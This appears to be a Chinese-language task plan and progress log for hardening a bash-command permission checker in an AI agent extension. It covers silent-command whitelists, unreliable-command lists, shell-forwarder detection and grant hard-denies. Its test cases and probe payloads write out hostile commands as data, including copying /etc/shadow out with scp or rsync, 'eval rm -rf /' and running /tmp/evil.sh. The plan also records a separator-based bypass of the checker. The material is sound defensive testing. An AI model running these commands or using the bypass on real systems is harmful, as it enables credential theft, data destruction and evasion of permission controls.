# Tasks: bash-stage-b-security-fixes

**权威测试账本**：见 proposal.md 末尾的 "scenario→test 覆盖账本" 表（BT-B1..BT-B30 + SYS-B1..SYS-B4）。本文件所有验证步骤按该账本编号引用，不再重复定义场景。任何编号冲突以 proposal.md 为准。

**关键链（Critical Chain）**：Phase 1（辅助函数）→ Phase 2（`extractRedirects`）→ Phase 3（`isShellForwarder`）→ Phase 4（`SILENT_COMMANDS` 收窄 + `isSilentCommand`）→ Phase 5（`UNRELIABLE_COMMANDS` 接入）→ Phase 6（`handleBash` C5 兜底）→ Phase 7（完整回归）→ Phase 8（安全探针）。每个 Phase 都依赖前一个 Phase 的产出，无法并行——Phase 2 用既有 helper；Phase 3 需要 shell 命令判定；Phase 4 引入结构化 SILENT；Phase 5 需要 Phase 1 的 `UNRELIABLE_COMMANDS` 常量；Phase 6 复用 Phase 1 的 `tokenize`。

**Project buffer（tier-medium = 35%）**：关键链 8 条任务，估时 8 单位（假设每任务 1 单位），project buffer = 35% × 8 = 2.8 单位。留作：
- `isSilentCommand` 的 flag/token 扫描逻辑（跳过 `-x=val` 与 `-x val` 两种形式、处理 `--` 分隔符）最复杂，预留 1 单位
- C5 的裸路径 token 扫描（quote-aware + looksLikePath + expandHome）跨模块复用，可能需调整 `bash-extract.ts` 的导出，预留 0.5 单位
- 收窄 SILENT 后既有测试（BMG 系列 SILENT 相关、既有 `test/bash-extract.test.ts` 中 `git log`/`npm test` 断言）逐条诊断更新，预留 1.3 单位

buffer 不消耗则视为"项目提前完成"，不追加新任务。

---

## 1. 辅助函数与常量（Phase 1，纯新增，无调用点接入）

- [x] 1.1 在 `src/lib/bash-extract.ts` 新增结构化 `SILENT_COMMANDS` 常量（`Record<string, Set<string>>`），按 design.md D1 定义填 12 条命令（`git`/`npm`/`npx`/`yarn`/`pnpm`/`tsc`/`cargo`/`go`/`make`/`rg`/`jq`/`openspec`）。**保留旧的 SILENT_COMMANDS 定义在同一文件里作为 `_LEGACY_SILENT_COMMANDS` 注释（若需 git blame 追溯），或直接覆盖**——不保留旧定义。**注意**：`rg` 与 `jq` 从 SILENT 移除后，本 change 后续 Phase 5 会把它们列入 UNRELIABLE_COMMANDS。
- [x] 1.2 新增 `UNRELIABLE_COMMANDS` 常量（`Set<string>`），按 design.md D2 定义填全部命令名（脚本解释器 15 个 + 系统脚本执行器 4 个 + 网络工具 9 个 + 容器编排 5 个 + shell 元命令 3 个 + 本 change 追加的 `rg`/`jq`/`make`/`cargo`/`npx` 5 个 = 41 个命令名）。**说明**：`rg`/`jq`/`make`/`cargo`/`npx` 从 SILENT 移除后，必须显式列入 UNRELIABLE_COMMANDS 才不会被 fail-open 漏掉（proposal 声明 unknown command → fail-open 是本 change 的 Non-Goal）
- [x] 1.3 新增辅助函数 `isSilentCommand(cmdName: string, tokens: string[]): boolean`，按 design.md D1 实现（命令名 ∈ 白名单 + 首个非 flag token ∈ 允许子命令集合；空白名单集合等价于"任意子命令或全 flag 都静默"）。验证：单元测试 `test("helper: isSilentCommand", ...)` 覆盖
  - **正例（静默）**：`git status`、`git log --oneline -n 10`、`npm test`、`yarn lint`、`pnpm audit`、`openspec status --change foo --json`、`tsc --noEmit`、`cargo check`、`go version`、`make`（`make` 空集合、无 token）
  - **反例（非静默）**：`git log /etc/passwd`（位置参数不是允许子命令）、`npm run build`（`run` 不在白名单）、`npx prettier`（`prettier` 不在白名单）、`npx --yes` 单独（`--yes` 在允许集合）、`make -f /tmp/evil.mk`（`make` 空集合但 `-f` 后跟位置参数，需按 D1 规则判定；实际实现：空集合 + 有非 flag token 时返回 false）、`rg pattern /etc/shadow`、`jq . /etc/shadow`、`cargo run --manifest-path /tmp/x/Cargo.toml`
- [x] 1.4 新增辅助函数 `isAnyUnreliableCommand(rawCommand: string): boolean`，按 design.md D2 实现：用 `splitCommands` 拆分为片段，对每个片段的首命令（跳过 `env`/`command` wrapper 前缀）取 basename 后精确匹配 `UNRELIABLE_COMMANDS`。验证：单元测试 `test("helper: isAnyUnreliableCommand", ...)` 覆盖
  - **正例（命中 unreliable）**：`sed -i 's/a/b/' /etc/passwd`、`python3 -c '...'`、`node -e '...'`、`perl -e '...'`、`osascript -e '...'`、`scp /etc/shadow host:/tmp/`、`ssh user@host '...'`、`rsync -a /etc/ host:/tmp/`、`kubectl exec pod -- cat /etc/shadow`、`eval 'rm -rf /'`、`docker run alpine sh -c '...'`、`git status && sed -i 'x' /etc/passwd`
  - **反例（不命中）**：`echo hi`、`cat /etc/passwd`、`bash -c '...'`（shell_forwarder 更早触发）、`/usr/bin/sed -i 'x' file`——**注意此反例实际上应命中**（basename 提取后匹配），所以反例集应为：`echo "sed -i"`（`sed` 在字符串内）、`ls /tmp`
- [x] 1.5 新增辅助函数 `tokenizeBashCommand(command: string): string[]` 与 `looksLikePathToken(token: string): boolean`（C5 用）——若 `bash-extract.ts` 已导出 `tokenize` 与 `looksLikePath`，直接复用；若未导出，将二者 `export`（仅导出，不改内部实现）。验证：单元测试覆盖
  - `tokenizeBashCommand("cat /etc/passwd && echo ok")` 返回 `["cat", "/etc/passwd", "&&", "echo", "ok"]` 或类似（quote-aware 拆分）
  - `looksLikePathToken("/etc/passwd")` → true
  - `looksLikePathToken("cat")` → false
  - `looksLikePathToken("$VAR/file")` → false（含未展开变量）
  - `looksLikePathToken("~/.ssh/id_rsa")` → true

**Phase 1 验收**：`node --experimental-strip-types --test test/bash-extract.test.ts` 全通过（无调用点接入，主流程 0 改动，除 helper 单元测试本身）。**实测结果**：265 pass / 0 fail（既有 232 + 新增 33）；实际接入点改动（`isForBodyReadOnly` 与 `extractBashTargets` 主流程的 `SILENT_COMMANDS.has` 调用改为 `isSilentCommand`）随 Phase 1 完成——否则 TypeScript 类型不匹配无法编译。原 Phase 4 的第 4.1 / 4.2 项因此合并到 Phase 1；Phase 4 只需回归 SILENT 收窄相关测试。

## 2. `extractRedirects` 新增 `<` 输入重定向（Phase 2）

- [ ] 2.1 在 `extractRedirects` 中新增 `<` 输入重定向分支：在既有 `2>` / `2>>` / `>` / `>&` 判定**之前**检查 `command[i] === "<"`；若命中且 `command[i+1] !== "<"`（避开 heredoc），把 `action` 设为 `read` 并 push read target；`<<` 序列跳过（由 scanUnreliable 处理 heredoc）。验证：account BT-B19（`bash < /tmp/evil.sh`）、BT-B20（`diff < /etc/passwd < /etc/hosts`）、BT-B21（`awk '{print}' < /etc/shadow`）+ 新增 heredoc 与 process substitution 反例测试全通过
- [ ] 2.2 回归 `>`/`>>`/`2>`/`2>>`/`>&` 既有测试。验证：`node --experimental-strip-types --test test/bash-extract.test.ts -n "redirect"` 全通过；重点确认既有 `BT-extra fd-redirect` 组零回归
- [ ] 2.3 确认 `<>`（read-write 模式）本 change 不处理——写针对性单元测试断言 `<>` 不产生任何 target（等价于无操作）

**Phase 2 验收**：`node --experimental-strip-types --test test/bash-extract.test.ts` 全通过，含新 BT-B19..BT-B21 + 回归测试。

## 3. `isShellForwarder` 扩展覆盖脚本路径与 source/dot-source（Phase 3）

- [ ] 3.1 修改 `isShellForwarder`：在既有 `-c` 检查之外，增加"非 flag 位置参数"判定（`bash /tmp/x.sh`、`bash -x /tmp/x.sh` 触发）；在 wrapper 循环中把 `source` 与 `.` 与 shell 转发器并列检查（`source /tmp/x.sh`、`. /tmp/x.sh` 触发）。验证：account BT-B15（`bash /tmp/evil.sh`）、BT-B16（`bash -x /tmp/evil.sh`）、BT-B17（`source /tmp/x.sh`）、BT-B18（`. /tmp/x.sh`）+ 新增 `env bash /tmp/x.sh`、`env FOO=1 source /tmp/x.sh` 反例测试全通过
- [ ] 3.2 反例回归：`bash --version`、`bash -x`（单独无位置参数）、`echo bash`、`which bash` 不触发 shell_forwarder
- [ ] 3.3 **删除** spec.md 现有反例 scenario "`bash /tmp/x.sh` 不触发 shell_forwarder" 对应的既有测试断言——查找 `test/bash-extract.test.ts` 中相关断言并删除或改为断言"触发"（这是 BREAKING 变更的测试面更新）

**Phase 3 验收**：`node --experimental-strip-types --test test/bash-extract.test.ts -n "shell_forwarder"` + `-n "source"` + `-n "dot"` 全通过；BTP-* 系列 shell-forwarder 既有测试零回归（除被本 change 覆盖的反例）。

## 4. `SILENT_COMMANDS` 收窄接入（Phase 4）

- [ ] 4.1 修改 `isForBodyReadOnly`（`bash-extract.ts` L1821-1841）：把 `SILENT_COMMANDS.has(cmdName)` 改为 `isSilentCommand(cmdName, tokens)`。验证：`grep -c "SILENT_COMMANDS.has" src/lib/bash-extract.ts` 输出 `0`（旧 API 完全清除）
- [ ] 4.2 修改 `extractBashTargets` 主流程（`bash-extract.ts` L2141 附近）：把 `SILENT_COMMANDS.has(cmdName)` 分支改为 `isSilentCommand(cmdName, tokens)`；命令不命中则继续走 normal unknown-command 分支（fail-open 保留）
- [ ] 4.3 回归 C1 相关正例与反例：account BT-B1（`npm run build`）、BT-B2（`git log /etc/passwd`）、BT-B3（`rg pattern /etc/shadow`）、BT-B4（`jq . /etc/shadow`）、BT-B5（`make -f /tmp/evil.mk`）、BT-B6（`cargo run --manifest-path /tmp/x/Cargo.toml`）应判 unreliable 或非 SILENT
- [ ] 4.4 回归合法用例：account BT-B23（`git status`）、BT-B24（`npm test`）、BT-B25（`git log --oneline -n 10`）仍 reliable；`grep` BMG52-BMG63 与 BMG70-BMG74 既有测试（SILENT 相关的 bounded glob / forwarding_command）确保零回归

**Phase 4 验收**：`node --experimental-strip-types --test test/bash-extract.test.ts` 全通过，含 C1 6 条新测试 + 收窄后合法用例 3 条回归；既有 BMG 系列 SILENT 相关测试通过（若有失败用例属于"预期行为扩展"，更新测试期望并注释说明）。

## 5. `UNRELIABLE_COMMANDS` 接入（Phase 5）

- [ ] 5.1 在 `extractBashTargets` 主流程中，在既有 `isShellForwarder` 检查之后、`findUnresolvedVariable` 之前插入 `isAnyUnreliableCommand` 检查：命中则 `return { reliable: false, rawCommand, reason: "unreliable_command" }`
- [ ] 5.2 回归 C2 相关 8 条测试：account BT-B7（`sed -i 'x' /etc/passwd`）、BT-B8（`python3 -c '...'`）、BT-B9（`node -e '...'`）、BT-B10（`perl -e '...'`）、BT-B11（`osascript -e '...'`）、BT-B12（`scp /etc/shadow host:/tmp/`）、BT-B13（`ssh user@host '...'`）、BT-B14（`rsync -a /etc/ host:/tmp/`）全部判 `reliable: false, reason: "unreliable_command"`
- [ ] 5.3 新增 3 条集成测试：`kubectl exec pod -- cat /etc/shadow`、`docker run alpine sh -c 'cat /etc/shadow'`、`eval 'rm -rf /'` 都判 `unreliable_command`
- [ ] 5.4 回归 reason 优先级：`bash -c 'sed -i x /etc/passwd'` 应判 `shell_forwarder`（外层 shell 优先）；`sed -i "x" $(cat /etc/passwd)` 应判 `command_substitution`（scanUnreliable 更早）；`git status && sed -i 'x' /etc/passwd` 应判 `unreliable_command`（第二 fragment 命中）

**Phase 5 验收**：`node --experimental-strip-types --test test/bash-extract.test.ts` 全通过，含 C2 8 条 + 集成 3 条 + reason 优先级 3 条回归。

## 6. `handleBash` C5 兜底检查（Phase 6）

- [ ] 6.1 在 `extensions/index.ts` L453-472 的 bash grant 命中分支（`hasBashSessionGrant` / `hasBashPersistentGrant` 任一命中）后插入 unread 兜底检查：调用 `tokenizeBashCommand(command)` 拿 token 数组，对每个 token 若 `looksLikePathToken` 则 `expandHome` + `toAbsolutePath` + `state.policy.resolve(absPath)`；任一 `entry?.permission === "unread"` 则返回 `{ block: true, reason: "..." }` 并记录 `event: "hard_deny"` audit log（`note: "Bash command grant bypassed: unread hard-deny for <path>"`）
- [ ] 6.2 回归 C5 相关 4 条测试（写在 `extensions/index.test.ts`）：account SYS-B1（session grant + unread 硬拒绝）、SYS-B2（persistent grant + unread 硬拒绝）、SYS-B3（grant 无 unread 仍生效）、SYS-B4（grant 部分路径 unread 硬拒绝）全通过
- [ ] 6.3 回归既有 bash grant 测试（BGM-* 组）：`grep -A 3 "BGM-" extensions/index.test.ts` 列出所有相关测试，确认零回归
- [ ] 6.4 验证 audit log 结构：C5 硬拒绝时的 audit 记录符合 `event: "hard_deny"` + `grant_type: "bash"` + `note: "..."` schema（与既有 access-decision 分系统的 hard_deny 一致）

**Phase 6 验收**：`node --experimental-strip-types --test extensions/index.test.ts` 全通过，含 SYS-B1..SYS-B4 + 既有 BGM-* 系列零回归；`test/backlog-regression.test.ts`（SYS9/SYS10/SYS11）零回归。

## 7. 完整回归（Phase 7）

- [ ] 7.1 跑完整测试套件 `node --experimental-strip-types --test test/ extensions/` 全通过。重点确认：
  - `test/bash-extract.test.ts` 1726+ 行既有用例零回归（除被本 change 覆盖的 SILENT/forwarder 反例）
  - `test/security-probe.mjs`（stage-a 遗留）零回归
  - `extensions/index.test.ts` 既有 all-prompt/tier=two/decision 系列测试零回归
  - `test/backlog-regression.test.ts`（SYS9/SYS10/SYS11）零回归
- [ ] 7.2 若有测试失败，逐条诊断：属于"预期行为扩展"（合法用例变弹窗）的更新测试期望并注释说明；属于"回归"的回滚本 change 对应改动或修正实现。

**Phase 7 验收**：`node --experimental-strip-types --test test/ extensions/` exit code 0。

## 8. 安全探针（Phase 8）

- [ ] 8.1 在 `test/security-probe.mjs` 追加 5 条原始审计 payload（C1..C5 各 1 条代表命令）：
  ```javascript
  // C1 SILENT_COMMANDS 越界
  ["npm run build", "UNRL[unreliable_command] or non-silent"],
  ["git log /etc/passwd", "non-silent (unreliable or 0-target)"],
  // C2 未列入任何表
  ["sed -i 'x' /etc/passwd", "UNRL[unreliable_command]"],
  ["python3 -c 'open(\"/etc/evil\",\"w\")'", "UNRL[unreliable_command]"],
  // C3 shell-forwarder 覆盖不全
  ["bash /tmp/evil.sh", "UNRL[shell_forwarder]"],
  ["source /tmp/x.sh", "UNRL[shell_forwarder]"],
  // C4 `<` 输入重定向
  ["bash < /tmp/evil.sh", "OK targets>=1 (read target)"],
  ["diff < /etc/passwd < /etc/hosts", "OK targets>=2 (two read targets)"],
  ```
- [ ] 8.2 运行 `node --experimental-strip-types test/security-probe.mjs`，验证输出中：
  - C1 两条不再显示 `OK W=[] R=[] D=[]`（静默通过）
  - C2 两条显示 `UNRL[unreliable_command]`
  - C3 两条显示 `UNRL[shell_forwarder]`
  - C4 两条显示 `OK targets>=N` 且 N 分别为 1 和 2
- [ ] 8.3 **注**：C5 无法通过 `extractBashTargets` 单测探针验证——它需要完整 extension + `state.policy` 上下文，由 SYS-B1..SYS-B4 单元测试覆盖。此步骤的探针覆盖 C1..C4 四类

**Phase 8 验收**：`node --experimental-strip-types test/security-probe.mjs` 输出中，8 条 payload 全部符合 expected 描述。

## 9. 文档更新

- [x] 9.1 更新 `README.md` 的 "Silent commands" 章节：改述收窄后的白名单结构（命令名 + 子命令组合），移除"副作用约束在 worktree 内"这一描述
- [x] 9.2 新增 `README.md` 的 "Unreliable commands" 章节：列出 `UNRELIABLE_COMMANDS` 分类（脚本解释器 / 系统脚本执行器 / 网络工具 / 容器编排 / shell 元命令），说明"命令名精确匹配即判 unreliable，无法通过 Always allow 持久化"
- [x] 9.3 更新 `README.md` 的 "Unreliable constructs" 列表：增加 shell + 脚本路径、source、dot-source、`<` 输入重定向
- [x] 9.4 更新 `README.md` 的 "Grant memory" 或 "Unread paths" 章节：明确 bash-command grant 命中后 unread 仍优先，用户如需撤回 bash 授权需依赖 unread 硬拒绝（其他撤回机制留待未来）
- [x] 9.5 更新 `src/lib/bash-extract.ts` 顶部注释（若有）以反映新增的辅助函数与常量

## 9.5. Phase 9 补充回归（4b 加严引发的既有测试失败）

- [x] 修复 BTP17 / BTP19 / BTP22 / BMG16 / BMG32 / BTP20 六个既有测试的失败：
  - 4b 检查仅在"简单单命令"上运行（跳过含 `|`/`;`/`&&`/`||`/`>`/`<` 的命令，交由 stage loop 处理）
  - `git` 允许 subcommand 后跟非 path-like 的 revision 词（如 `HEAD`、`main`、`HEAD~1`）
  - `SILENT_ALLOW_ALL`（openspec）跳过 subcommand 检查
  - 长 flag（`--x`）与短 flag（`-x`）区分处理：只有不含 `=` 时才可消费下一 token 作为值
  - `SILENT_COMMANDS.git` 补齐 `ls-files`
- [x] 最终 435 tests / 0 fail；security-probe 35 / 35 pass

## 10. 收尾

- [x] 10.1 `openspec validate bash-stage-b-security-fixes --type change --json` 通过，exit code 0
- [x] 10.2 架构 review 通过（无 critical issue）——首次 `deep+verify` 因容量问题 4 维度全失败，降级 `deep` 只完成 security 1 维度（correctness / performance / tests_contracts 未跑，为已知盲区）。security 维度产出 3 条 P3，均已落地修复：
  - **10.2a** 删除 `extensions/index.test.ts` 的死代码 helper `setupBashGrantScenario`（未使用，易误认作 canonical helper）
  - **10.2b** 将 Phase-2 测试从 BT-B19/20/21（与 Phase-1 重复）重编号为 BT-B22/23/24（含 b/c/d 子号），消除同文件重复 ID 与 coverage ledger 冲突
  - **10.2c** README 静默命令表补齐 `git ls-files`；补充 "how silent match is enforced" 段说明 `git` revision 词豁免、pipeline/compound/redirect 由 stage loop 处理；补充 "Commands moved out of the silent whitelist" 段说明 `make/npx/rg/jq/cargo` 的实际行为（同时在 SILENT 与 UNRELIABLE，实际永远走 unreliable_command）
- [ ] 10.3 提交 git（本 change 完成后由用户手动 git commit，本 change 不自动提交）

## 10.4 Phase 10.4 独立 LLM 审核回归（用户手动触发的 subagent review）

Phase 10.2 的 code_review 因容量问题只跑了 security 1 维度（correctness / performance / tests_contracts 未审）。用户手动启动 subagent 独立 LLM 审核补齐，subagent 产出 1 P0 + 3 P1 + 2 P2 + 2 P3 共 8 条发现。全部按严重性落地：

- [x] 10.4a **P0 修复**：`isShellForwarder` 感知 compound separator（`&&`/`||`/`;`/`&`/`\n`）——原本只扫首 pipeline stage 首 token，`echo hi && bash /tmp/evil.sh` 逃逸。外层新增 `splitCommands` 循环，对每 fragment 再 `splitPipelines`，对每 stage 走 token 扫描。新增 BT-B25..BT-B31 覆盖 `&&`/`;`/`||`/多行/`env FOO=1 bash` 等场景。
- [x] 10.4b **P1 修复**：抽出 `skipWrapperTokens` helper，`isAnyUnreliableCommand` 与 `isShellForwarder` 共用；wrapper 短 flag 感知：
  - `command` builtin：`-v`/`-V` 是"查询目标"（消费下一 token 作为查询名，不视为命令调用）
  - `env`：`-u`/`-C`/`-P`/`-S`/`-I` 是"取值 flag"（消费下一 token 作为值）
  - 其余 `-v`/`-x`/`-i` 等 value-less 短 flag 直接消费
  - 新增 BT-B32..BT-B36 覆盖 `command -v sed` / `command -V sed` / `command -v bash` / `env -u FOO bash /tmp/x.sh` / `env -u FOO -x bash /tmp/x.sh` / `command -v bash`。
- [x] 10.4c **P2 修复**：4b `hasOp` 改用 `splitCommands`/`splitPipelines` 长度判定替代字符扫描，确保 compound command（`git status && rm -rf /etc/passwd`）不进入 4b silent-form block。新增 BT-B37 覆盖。
- [x] 10.4d **P2 文档**：`design.md` D1/D3 各加 "Implementation delta" 段记录 6 类实现偏差（`git ls-files` 补齐、`npm run` 移除、`SILENT_ALLOW_ALL` 抽出、双重归属、flag-value 组合处理、`bash --version /dev/null` 边界接受）。
- [x] 10.4e **P3 卫生**：`test/bash-extract.test.ts` 顶部加 "Test-ID hygiene note"，说明 BT-B* ID 非全局唯一（BT-B14 出现 17 次等），保留历史编号避免动 ~200 处引用。
- [x] 10.4f **最终验证**：448 tests / 0 fail；security-probe 35/35 pass；`openspec validate` passed。相比 Phase 9 结束时的 435 tests 增加 13 个（BT-B25..BT-B37），全部为 P0/P1/P2 修复的回归测试。

**结论**：subagent 独立 LLM 审核找到的 P0 漏洞（compound separator 逃逸）是本 change 上线前必须修的关键问题，已闭合。剩余 P3（BT-B ID 全量重排）保留为已知限制，不改。

**Apply 顺序**：本 change 应在 stage-a 之后 apply（stage-a 已归档），且是独立的下一个 change（无并行冲突）。若未来有其他 change 需要复用 `isSilentCommand` 或 `UNRELIABLE_COMMANDS` 常量，可以基于本 change 的 Phase 1 产出。
